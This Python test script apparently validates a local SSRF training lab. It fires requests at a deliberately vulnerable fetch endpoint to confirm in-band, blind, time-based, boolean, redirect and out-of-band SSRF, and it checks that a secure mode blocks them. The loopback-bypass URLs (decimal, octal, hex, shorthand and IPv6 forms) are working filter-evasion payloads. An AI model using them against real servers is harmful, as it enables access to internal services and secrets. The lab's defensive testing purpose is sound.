import urllib.request
import urllib.parse
import json
import time

def test_endpoint(name, url, expected_status=None, check_fn=None):
    print(f"\n[*] Testing: {name}")
    print(f"    URL: {url}")
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "SSRF-Sentinel-Validator/1.0"})
        start = time.time()
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                elapsed = time.time() - start
                status = resp.status
                body = resp.read().decode('utf-8', errors='replace')
                headers = dict(resp.headers)
        except urllib.error.HTTPError as e:
            elapsed = time.time() - start
            status = e.code
            body = e.read().decode('utf-8', errors='replace')
            headers = dict(e.headers)

        print(f"    Status: {status} (in {elapsed:.2f}s)")
        print(f"    Body preview: {body[:120]}...")
        if expected_status is not None:
            assert status == expected_status, f"Expected {expected_status}, got {status}"
        if check_fn:
            check_fn(status, body, headers, elapsed)
        print("    --> PASS [OK]")
        return True, status, body
    except Exception as e:
        print(f"    --> FAILED: {e}")
        return False, None, str(e)

results = []

# 1. Health checks
results.append(test_endpoint("Public Health (8080)", "http://127.0.0.1:8080/health", expected_status=200))
results.append(test_endpoint("OOB Health (8090)", "http://127.0.0.1:8090/health", expected_status=200))

# 2. In-band SSRF
results.append(test_endpoint("In-Band Secret Exposure", 
    "http://127.0.0.1:8080/fetch?url=http://127.0.0.1:8081/internal/secret", 
    expected_status=200, 
    check_fn=lambda s, b, h, t: "SSRF_SENTINEL_INTERNAL_ACCESS_2026" in b))

results.append(test_endpoint("In-Band Admin Vault Exposure", 
    "http://127.0.0.1:8080/fetch?url=http://127.0.0.1:8081/internal/admin/config", 
    expected_status=200, 
    check_fn=lambda s, b, h, t: "SSRF_SENTINEL_INBAND_FULL_ACCESS" in b))

# 3. Limited-response SSRF
results.append(test_endpoint("Limited-Response Status-Only (204)", 
    "http://127.0.0.1:8080/fetch?url=http://127.0.0.1:8081/internal/limited/status-only", 
    expected_status=204))

results.append(test_endpoint("Limited-Response Header-Only", 
    "http://127.0.0.1:8080/fetch?url=http://127.0.0.1:8081/internal/limited/header-only", 
    expected_status=200, 
    check_fn=lambda s, b, h, t: "SSRF_HEADER_ONLY_FLAG" in h.get("X-Internal-Marker", "")))

results.append(test_endpoint("Limited-Response Truncated", 
    "http://127.0.0.1:8080/fetch?url=http://127.0.0.1:8081/internal/limited/truncated", 
    expected_status=200, 
    check_fn=lambda s, b, h, t: "SSRF_SECRET_SEGMENT_PARTIAL_DATA_REDA" in b))

# 4. Time-based SSRF
results.append(test_endpoint("Time-Based Fast (<0.5s)", 
    "http://127.0.0.1:8080/fetch?url=http://127.0.0.1:8081/internal/fast", 
    expected_status=200, 
    check_fn=lambda s, b, h, t: t < 0.5))

results.append(test_endpoint("Time-Based Delayed (~1.5s)", 
    "http://127.0.0.1:8080/fetch?url=http://127.0.0.1:8081/internal/delayed?ms=1500", 
    expected_status=200, 
    check_fn=lambda s, b, h, t: t >= 1.4))

# 5. Boolean-based SSRF
results.append(test_endpoint("Boolean Condition True (200)", 
    "http://127.0.0.1:8080/fetch?url=http://127.0.0.1:8081/internal/check?condition=true", 
    expected_status=200, 
    check_fn=lambda s, b, h, t: "SSRF_BOOLEAN_TRUE_VERIFIED" in b))

results.append(test_endpoint("Boolean Condition False (404)", 
    "http://127.0.0.1:8080/fetch?url=http://127.0.0.1:8081/internal/check?condition=false", 
    expected_status=404, 
    check_fn=lambda s, b, h, t: "MATCH_FALSE" in b))

# 6. Redirect SSRF
results.append(test_endpoint("Redirect-Based SSRF (Follows to /internal/secret)", 
    "http://127.0.0.1:8080/fetch?url=http://127.0.0.1:8081/internal/redirect?to=/internal/secret", 
    expected_status=200, 
    check_fn=lambda s, b, h, t: "SSRF_SENTINEL_INTERNAL_ACCESS_2026" in b))

# 7. URL Validation & Alternative Loopback Bypasses
results.append(test_endpoint("Alternative IP - Decimal Notation (2130706433)", 
    "http://127.0.0.1:8080/fetch?url=http://2130706433:8081/internal/secret", 
    expected_status=200, 
    check_fn=lambda s, b, h, t: "SSRF_SENTINEL_INTERNAL_ACCESS_2026" in b))

results.append(test_endpoint("Alternative IP - Shorthand Notation (127.1)", 
    "http://127.0.0.1:8080/fetch?url=http://127.1:8081/internal/secret", 
    expected_status=200, 
    check_fn=lambda s, b, h, t: "SSRF_SENTINEL_INTERNAL_ACCESS_2026" in b))

results.append(test_endpoint("Alternative IP - Octal Notation (0177.0.0.1)", 
    "http://127.0.0.1:8080/fetch?url=http://0177.0.0.1:8081/internal/secret", 
    expected_status=200, 
    check_fn=lambda s, b, h, t: "SSRF_SENTINEL_INTERNAL_ACCESS_2026" in b))

results.append(test_endpoint("Alternative IP - Hex Notation (0x7f000001)", 
    "http://127.0.0.1:8080/fetch?url=http://0x7f000001:8081/internal/secret", 
    expected_status=200, 
    check_fn=lambda s, b, h, t: "SSRF_SENTINEL_INTERNAL_ACCESS_2026" in b))

results.append(test_endpoint("Alternative IP - IPv6 Loopback ([::1])", 
    "http://127.0.0.1:8080/fetch?url=http://[::1]:8081/internal/secret", 
    expected_status=200, 
    check_fn=lambda s, b, h, t: "SSRF_SENTINEL_INTERNAL_ACCESS_2026" in b))

# 8. Blind / Out-of-Band SSRF with Deduplication
token_data = json.loads(urllib.request.urlopen("http://127.0.0.1:8090/token/generate").read().decode())
tok = token_data["token"]
print(f"\n[*] Generated OOB Token: {tok}")

# First callback
results.append(test_endpoint("OOB Trigger Callback #1", 
    f"http://127.0.0.1:8080/fetch?url=http://127.0.0.1:8090/callback?token={tok}", 
    expected_status=200))

# Second callback (duplicate test)
results.append(test_endpoint("OOB Trigger Callback #2 (Duplicate)", 
    f"http://127.0.0.1:8080/fetch?url=http://127.0.0.1:8090/callback?token={tok}", 
    expected_status=200))

# Evidence check
ev = json.loads(urllib.request.urlopen(f"http://127.0.0.1:8090/evidence?token={tok}").read().decode())
print(f"[*] Evidence retrieved: Total Callbacks={ev['total_callbacks']}, Unique={ev['unique_tokens']}")
assert ev['total_callbacks'] == 2
assert ev['unique_tokens'] == 1
assert ev['callbacks'][0]['is_duplicate'] is False
assert ev['callbacks'][1]['is_duplicate'] is True
print("    --> OOB Deduplication Verified [OK]")

# 9. Secure Mode Enforcements
results.append(test_endpoint("Secure Mode - Blocks Port 8081 Internal Service", 
    "http://127.0.0.1:8080/fetch?url=http://127.0.0.1:8081/internal/secret&mode=secure", 
    expected_status=403, 
    check_fn=lambda s, b, h, t: "ERR_INTERNAL_PORT_BLOCKED" in b))

results.append(test_endpoint("Secure Mode - Blocks Alternative Host Notation (2130706433)", 
    "http://127.0.0.1:8080/fetch?url=http://2130706433:8081/internal/secret&mode=secure", 
    expected_status=403, 
    check_fn=lambda s, b, h, t: "ERR_NON_CANONICAL_HOST" in b))

results.append(test_endpoint("Secure Mode - Dedicated /fetch-secure Endpoint", 
    "http://127.0.0.1:8080/fetch-secure?url=http://127.0.0.1:8081/internal/secret", 
    expected_status=403, 
    check_fn=lambda s, b, h, t: "ERR_INTERNAL_PORT_BLOCKED" in b))

passed = sum(1 for r in results if r[0])
print(f"\n==========================================")
print(f"TEST SUMMARY: {passed}/{len(results)} PASSED")
print(f"==========================================")
